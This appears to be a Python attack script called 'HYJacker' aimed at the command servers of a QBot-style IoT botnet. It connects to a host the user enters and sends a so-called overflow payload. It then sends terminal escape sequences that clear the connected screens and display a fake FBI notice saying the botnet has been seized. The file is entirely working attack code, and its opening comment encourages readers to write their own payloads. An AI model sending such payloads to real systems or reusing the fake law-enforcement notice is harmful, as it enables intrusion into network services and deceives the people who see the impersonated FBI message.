# Try to make your own message!
# ^ Its not easy to fit it in the constraints of the buffers and bot detection, One small mistake or flaw can cause the payload to fuck up or not work at all
import socket, time
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((input("IP: "), int(input("Port: "))))
version = "fbi"
try:
    print("[HYJacker] Sending OverFlow Payload..")
    client_socket.sendall(b'\x04int []\x0A\x12\x34\x50\x36;Device Connected; \x34')
    client_socket.sendall(b'\r\n\033\\0x20#EXPLOIT WAS SUCCESSFUL!#\033[34m[IoT] St0p using QB0TS!r\n')
    time.sleep(1)
    if version == "fbi":client_socket.sendall('\r\n\033[2J\033[H\033[0;104mFBI Notice!\033[0;0m \r\033[1B\033[4;91mThis BotNet Has Been Seized. \r\033[1BAll Traffic Coming In And Out Is Now Monitored.\033[0;0m\033[1D\033[1C\033[1B\r\n⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀\r\n⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄\r\n⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄\r\n⠀⠀⢠⣿⡿⠿⠿⠿⠿⠿⠿⠿⣿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⠿⠿⢿⣿\r\n⠀⢀⣿⣿⡇⠀⠀⣠⣤⣄⣀⣠⣿⠀⠀⢀⣤⣀⡀⠀⠘⣿⣿⠀⠀⢸⣿⣿\r\n⠀⢸⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⠟⠀⠀⣿⣿⠀⠀⢸⣿⣿\r\n⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⠀⠀⢸⣿⣿⡧\r\n⠀⢸⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⠀⠀⢹⣿⠀⠀⢸⣿⣿\r\n⠀⠈⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠈⠛⠛⠉⠀⢀⣾⣿⠀⠀⢸⣿⣿\r\n⠀⠀⠸⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣶⣶⣾⣿\r\n⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋\r\n⠀⠀⠀⠀⠀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁\r\n⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋\r\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠋⠉⠉\r\n\r\n'.encode('utf-8'))
    print("[HYJacker] Sent over payload!")
    client_socket.close()
    print("[HYJacker] Closed our socket and cleaned up connection!")
except:
    print("Exploit failed, Socked died so ! BOTKILL was prob hit :(")
input()
